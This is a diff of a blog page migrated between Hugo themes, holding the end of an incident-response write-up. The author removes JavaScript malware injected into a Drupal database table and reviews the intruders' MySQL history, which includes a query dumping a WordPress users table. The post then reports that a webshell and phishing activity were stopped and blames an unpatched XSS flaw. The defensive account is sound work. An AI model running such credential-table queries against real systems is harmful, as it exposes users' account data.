+<p>Drupal uses MySQL database to load HTML content from modules. The hidden malicious javascript code (found in HTML) was injected in a MySQL table: <strong>block_custom</strong> in database: <strong>subdomainsite</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -942,7 +793,7 @@
 </span></span></span><span class="line"><span class="cl"><span class="go">Query OK, 1 row affected (0.03 sec)
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><p>After deleting the rows, the footer code disappeared, thus removing the malware from loading on the page &#x1f389; &#x1f389; &#x1f389;</p>
+</div><p>After deleting the rows, the footer code disappeared, thus removing the malware from loading on the page :tada: :tada: :tada:</p>
 <p>Also, when looking at MySQL command history:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1050,14 +901,13 @@
 </span></span></span><span class="line"><span class="cl"><span class="go">select * from wp_users; …
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><p>It looked like they tried to delete their spamming email domains: <a class="link" href="https://www.pozzo-balbi.com/help/List_of_email_spamming_domains"  target="_blank" rel="noopener"
-    >https://www.pozzo-balbi.com/help/List_of_email_spamming_domains</a></p>
-<h4 id="confetti_ball-now-the-webshell-irc-connections-and-phishing-activities-stopped-confetti_ball">&#x1f38a; Now, the webshell IRC connections and phishing activities stopped! &#x1f38a;
-</h4><h2 id="conclusion">Conclusion
-</h2><h3 id="bangbang-main-cause-bangbang--the-current-drupal-version-running-on-the-webserver-has-a-vulnerability-for-xss-attacks-this-was-confirmed-with-grabber-vulnerability-scanner-tool">&#x203c;&#xfe0f; MAIN CAUSE &#x203c;&#xfe0f; : The current Drupal version (running on the webserver) has a vulnerability for XSS attacks. This was confirmed with grabber vulnerability scanner tool.
-</h3><h3 id="white_check_mark-solution-white_check_mark--patch-systems-regularly-and-keep-an-eye-out-for-vulnerabilities-we-can-install-host-based-andor-network-based-intrusion-detection-systems-for-good-measure">&#x2705; SOLUTION &#x2705; : Patch systems regularly and keep an eye out for vulnerabilities. We can install Host-based and/or Network-based Intrusion Detection Systems for good measure.
-</h3><h3 id="cleaning-up">Cleaning Up
-</h3><p>Since we were not using the subdomain site, I simply shut it down:</p>
+</div><p>It looked like they tried to delete their spamming email domains: <a href="https://www.pozzo-balbi.com/help/List_of_email_spamming_domains">https://www.pozzo-balbi.com/help/List_of_email_spamming_domains</a></p>
+<h4 id="confetti_ball-now-the-webshell-irc-connections-and-phishing-activities-stopped-confetti_ball">:confetti_ball: Now, the webshell IRC connections and phishing activities stopped! :confetti_ball:</h4>
+<h2 id="conclusion">Conclusion</h2>
+<h3 id="bangbang-main-cause-bangbang--the-current-drupal-version-running-on-the-webserver-has-a-vulnerability-for-xss-attacks-this-was-confirmed-with-grabber-vulnerability-scanner-tool">:bangbang: MAIN CAUSE :bangbang: : The current Drupal version (running on the webserver) has a vulnerability for XSS attacks. This was confirmed with grabber vulnerability scanner tool.</h3>
+<h3 id="white_check_mark-solution-white_check_mark--patch-systems-regularly-and-keep-an-eye-out-for-vulnerabilities-we-can-install-host-based-andor-network-based-intrusion-detection-systems-for-good-measure">:white_check_mark: SOLUTION :white_check_mark: : Patch systems regularly and keep an eye out for vulnerabilities. We can install Host-based and/or Network-based Intrusion Detection Systems for good measure.</h3>
+<h3 id="cleaning-up">Cleaning Up</h3>
+<p>Since we were not using the subdomain site, I simply shut it down:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -1098,178 +948,37 @@
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div>
-</section>
+  </article>
 
+  
+  
+</main>
 
-    <footer class="article-footer">
-    
-    <section class="article-tags">
-        
-            <a href="/tags/technical/">Technical</a>
-        
-    </section>
-
-
-    
-    <section class="article-copyright">
-        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="12" r="9" />
-  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
-</svg>
-
-
-
-        <span>Licensed under CC BY-NC-SA 4.0</span>
-    </section>
-    </footer>
-
-
-    
-</article>
-
-    
-
-    
-
-     
-    
-        
-    <div class="disqus-container">
-    
-</div>
-
-<style>
-    .disqus-container {
-        background-color: var(--card-background);
-        border-radius: var(--card-border-radius);
-        box-shadow: var(--shadow-l1);
-        padding: var(--card-padding);
-    }
-</style>
-
-<script>
-    window.addEventListener('onColorSchemeChange', (e) => {
-        if (typeof DISQUS == 'object') {
-            DISQUS.reset({
-                reload: true
-            });
-        }
-    })
-</script>
-
-    
-
-    <footer class="site-footer">
-    <section class="copyright">
-        &copy; 
-        
-        2025 R4J
-    </section>
-    
-    <section class="powerby">
-        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
-        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
-    </section>
+    <footer id="footer">
+  <div>
+    <span>Powered by  <a class=link href=https://gohugo.io target=_blank rel=noopener>Hugo</a> | 
+Theme <a class=link href=https://github.com/michaelneuper/hugo-texify3 target=_blank rel=noopener>TeXify3</a>
+</span>
+  </div>
+  <div>
+    <span>Copyright © 2025 </span>
+  </div>
 </footer>
 
+  </div>
 
-    
-<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+  
+  <script src='http://localhost:1313/js/script.js' defer></script>
 
-    
-    <div class="pswp__bg"></div>
+  
+  
 
-    
-    <div class="pswp__scroll-wrap">
+  
+  
 
-        
-        <div class="pswp__container">
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-        </div>
+  
+  
 
-        
-        <div class="pswp__ui pswp__ui--hidden">
+</body>
 
-            <div class="pswp__top-bar">
-
-                
-
-                <div class="pswp__counter"></div>
-
-                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
-
-                <button class="pswp__button pswp__button--share" title="Share"></button>
-
-                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-
-                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-
-                
-                
-                <div class="pswp__preloader">
-                    <div class="pswp__preloader__icn">
-                        <div class="pswp__preloader__cut">
-                            <div class="pswp__preloader__donut"></div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-                <div class="pswp__share-tooltip"></div>
-            </div>
-
-            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-            </button>
-
-            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-            </button>
-
-            <div class="pswp__caption">
-                <div class="pswp__caption__center"></div>
-            </div>
-
-        </div>
-
-    </div>
-
-</div><script 
-                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
-                defer
-                >
-            </script><script 
-                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
-                defer
-                >
-            </script><link 
-                rel="stylesheet" 
-                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
-            ><link 
-                rel="stylesheet" 
-                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
-            >
-
-            </main>
-        </div>
-        <script 
-                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
-                
-                >
-            </script><script type="text/javascript" src="/ts/main.197cfff98b8d9d7430fb817e472e5f4f192462886c56ecfde6faca7a52be61e5.js" defer></script>
-<script>
-    (function () {
-        const customFont = document.createElement('link');
-        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
-
-        customFont.type = "text/css";
-        customFont.rel = "stylesheet";
-
-        document.head.appendChild(customFont);
-    }());
-</script>
-
-    </body>
 </html>
